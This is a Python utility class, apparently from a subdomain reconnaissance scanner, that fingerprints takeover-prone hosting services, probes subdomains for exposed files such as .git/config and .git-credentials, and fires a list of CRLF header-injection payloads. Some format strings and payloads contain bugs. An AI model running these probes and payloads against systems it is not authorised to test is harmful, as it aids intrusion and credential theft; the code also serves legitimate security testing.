import socket
import threading
import requests
import re
import os

class Util:
    def subdomain_sorting_key(self, hostname):
        """Sorting key for subdomains
    
        This sorting key orders subdomains from the top-level domain at the right
        reading left, then moving '^' and 'www' to the top of their group. For
        example, the following list is sorted correctly:
    
        [
            'example.com',
            'www.example.com',
            'a.example.com',
            'www.a.example.com',
            'b.a.example.com',
            'b.example.com',
            'example.net',
            'www.example.net',
            'a.example.net',
        ]
    
        """
        parts = hostname.split('.')[::-1]
        if parts[-1] == 'www':
            return parts[:-1], 1
        return parts, 0

    def write_file(self, filename, subdomains, find_ip=False):
        # saving subdomains results to output file
        with open(str(filename), 'wt') as f:
            for subdomain in subdomains:
                if find_ip:
                    ip = self.get_host_by_name(subdomain)
                    f.write("{} {}{}".format(subdomain, ip, os.linesep))
                else:
                    f.write(subdomain + os.linesep)
    
    def get_host_by_name(self, subdomain):
        try:
            return socket.gethostbyname(subdomain)
        except Exception:
            return "0.0.0.0"

    def get_url_signatures(self, url):
        service_signatures = {
            'Heroku': '<iframe src="//www.herokucdn.com/error-pages/no-such-app.html"></iframe>',
            'GitHub Pages': '<p> If you\'re trying to publish one, <a href="https://help.github.com/pages/">read the full documentation</a> to learn how to set up <strong>GitHub Pages</strong> for your repository, organization, or user account. </p>',
            'Squarespace': '<title>Squarespace - No Such Account</title>',
            'Shopify': '<div id="shop-not-found"> <h1 class="tc">Sorry, this shop is currently unavailable.</h1> </div>',
            'Zendesk': '<span class="title">Bummer. It looks like the help center that you are trying to reach no longer exists.</span>',
            'GitLab': '<head> <title>The page you\'re looking for could not be found (404)</title> <style> body { color: #666; text-align: center; font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; margin: 0; width: 800px; margin: auto; font-size: 14px; } h1 { font-size: 56px; line-height: 100px; font-weight: normal; color: #456; } h2 { font-size: 24px; color: #666; line-height: 1.5em; } h3 { color: #456; font-size: 20px; font-weight: normal; line-height: 28px; } hr { margin: 18px 0; border: 0; border-top: 1px solid #EEE; border-bottom: 1px solid white; } </style> </head>'
        }
        data = Util().get_url_data(url)
        if data == 0:
            return []
        # Strip newlines
        data = data.replace('\n', '').replace('\r', '')
        data = re.sub("\s\s+", ' ', data);
        results = []
        for name in service_signatures:
            if service_signatures[name] in data:
                results.append(name)
        return results

    def get_url_data(self, url, timeout=1):
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-GB,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        }
        try:
            resp = requests.Session().get(url, headers=headers, timeout=timeout)
        except Exception:
            resp = None
        if resp is None:
            return 0
        return resp.text if hasattr(resp, "text") else resp.content

    def leak_files(self, subdomain):
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-GB,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        }
        try:
            findings_checks = [ 'testing.php', 'test.php', 'test1.php', 'test2.php', '_test.php', 'info.php', 'phpinfo.php', 'php_info.php', 'php.php', 'install.php', 'changelog.txt', 'README.md', 'install.txt', '.git/HEAD', '.git/index', '.git/config', '.gitignore', '.git-credentials', '.bzr/README', '.bzr/checkout/dirstate', '.hg/requires', '.hg/store/fncache', '.svn/entries', '.svn/all-wcprops', '.svn/wc.db', '.svnignore', 'CVS/Entries', '.cvsignore', '.idea/misc.xml', '.idea/workspace.xml', '.DS_Store', 'composer.lock', 'nbproject/project.xml']
            for finding in findings_checks:
                site = "http://{0}/{1}".format(subdomain, finding)
                results = requests.get(site, timeout=1, verify=False, headers=headers)
                if results:
                    try:
                        if results.status_code == 200:
                            print("{}[{}][{}] HTTP {} {}".format(self.logger.Y, results.status_code, results.headers['content-length'], site, self.logger.W))
                            git_found = re.match(r'\[core\]', results.text, re.M|re.I)
                            if git_found:
                                print("{}[{}] Git Found  {} {}".format(self.logger.Y, results.status_code, site, self.logger.W))
                                print(results.text) 
                    except Exception as e:
                        pass
                site = "https://{0}/{1}".format(subdomain, finding)
                results = requests.get(site, timeout=1, verify=False, headers=headers)
                if results:
                    try:
                        if results.status_code == 200:
                            print("{}[{}][{}] HTTPS {} {}".format(self.logger.Y, results.status_code, results.headers['content-length'], site, self.logger.W))
                            git_found = re.match(r'\[core\]', results.text, re.M|re.I)
                            if git_found:
                                print("{}[{}] Git Found HTTPS {} {}".format(self.logger.Y, results.status_code, site, self.logger.W))
                                print(results.text)
                    except Exception as e:
                        pass
        except Exception as e:
                        pass

    def crlf(self, subdomain):
        # should create Set-Cookie:mycookie=myvalue header if vulnerable
        payloads = [r"%0ASet-Cookie:mycookie=myvalue",
                    r"%0A%20Set-Cookie:mycookie=myvalue",
                    r"%20%0ASet-Cookie:mycookie=myvalue",
                    r"%23%OASet-Cookie:mycookie=myvalue",
                    r"%E5%98%8A%E5%98%8DSet-Cookie:mycookie=myvalue",
                    r"%E5%98%8A%E5%98%8D%0ASet-Cookie:mycookie=myvalue",
                    r"%3F%0ASet-Cookie:mycookie=myvalue",
                    r"crlf%0ASet-Cookie:mycookie=myvalue",
                    r"crlf%0A%20Set-Cookie:mycookie=myvalue",
                    r"crlf%20%0ASet-Cookie:mycookie=myvalue",
                    r"crlf%23%OASet-Cookie:mycookie=myvalue",
                    r"crlf%E5%98%8A%E5%98%8DSet-Cookie:mycookie=myvalue",
                    r"crlf%E5%98%8A%E5%98%8D%0ASet-Cookie:mycookie=myvalue",
                    r"crlf%3F%0ASet-Cookie:mycookie=myvalue",
                    r"%0DSet-Cookie:mycookie=myvalue",
                    r"%0D%20Set-Cookie:mycookie=myvalue",
                    r"%20%0DSet-Cookie:mycookie=myvalue",
                    r"%23%0DSet-Cookie:mycookie=myvalue",
                    r"%E5%98%8A%E5%98%8DSet-Cookie:mycookie=myvalue",
                    r"%E5%98%8A%E5%98%8D%0DSet-Cookie:mycookie=myvalue",
                    r"%3F%0DSet-Cookie:mycookie=myvalue",
                    r"crlf%0DSet-Cookie:mycookie=myvalue",
                    r"crlf%0D%20Set-Cookie:mycookie=myvalue",
                    r"crlf%20%0DSet-Cookie:mycookie=myvalue",
                    r"crlf%23%0DSet-Cookie:mycookie=myvalue",
                    r"crlf%E5%98%8A%E5%98%8DSet-Cookie:mycookie=myvalue",
                    r"crlf%E5%98%8A%E5%98%8D%0DSet-Cookie:mycookie=myvalue",
                    r"crlf%3F%0DSet-Cookie:mycookie=myvalue",
                    r"%0D%0ASet-Cookie:mycookie=myvalue",
                    r"%0D%0A%20Set-Cookie:mycookie=myvalue",
                    r"%20%0D%0ASet-Cookie:mycookie=myvalue",
                    r"%23%0D%0ASet-Cookie:mycookie=myvalue",
                    r"%E5%98%8A%E5%98%8DSet-Cookie:mycookie=myvalue",
                    r"%E5%98%8A%E5%98%8D%0D%0ASet-Cookie:mycookie=myvalue",
                    r"%3F%0D%0ASet-Cookie:mycookie=myvalue",
                    r"crlf%0D%0ASet-Cookie:mycookie=myvalue",
                    r"crlf%0D%0A%20Set-Cookie:mycookie=myvalue",
                    r"crlf%20%0D%0ASet-Cookie:mycookie=myvalue",
                    r"crlf%23%0D%0ASet-Cookie:mycookie=myvalue",
                    r"crlf%E5%98%8A%E5%98%8DSet-Cookie:mycookie=myvalue",
                    r"crlf%E5%98%8A%E5%98%8D%0D%0ASet-Cookie:mycookie=myvalue",
                    r"crlf%3F%0D%0ASet-Cookie:mycookie=myvalue",
                    r"%0D%0A%09Set-Cookie:mycookie=myvalue",
                    r"crlf%0D%0A%09Set-Cookie:mycookie=myvalue",
                    r"%250ASet-Cookie:mycookie=myvalue",
                    r"%25250ASet-Cookie:mycookie=myvalue",
                    r"%%0A0ASet-Cookie:mycookie=myvalue",
                    r"%25%30ASet-Cookie:mycookie=myvalue",
                    r"%25%30%61Set-Cookie:mycookie=myvalue",
                    r"%u000ASet-Cookie:mycookie=myvalue",
                    r"//www.google.com/%2F%2E%2E%0D%0ASet-Cookie:mycookie=myvalue",
                    r"/www.google.com/%2E%2E%2F%0D%0ASet-Cookie:mycookie=myvalue",
                    r"/google.com/%2F..%0D%0ASet-Cookie:mycookie=myvalue"]
                    
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-GB,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        }

        for payload in payloads:
            try:
                site = "http://{0}/{1}".format(subdomain, payload)
                results = requests.get(site, verify=False, timeout=.5, allow_redirects=False, headers=headers)
                for name in results.cookies.keys():
                    if "mycookie" in name:
                        print("[+] Vulnerable: {0}{1}/{2}".format(site, payload))

                site = "https://{0}/{1}".format(subdomain, payload)
                results = requests.get(site, verify=False, timeout=.5, allow_redirects=False, headers=headers)
                for name in results.cookies.keys():
                    if "mycookie" in name:
                        print("[+] Vulnerable: {0}{1}/{2}".format(site, payload))
            except Exception as e:
                pass
        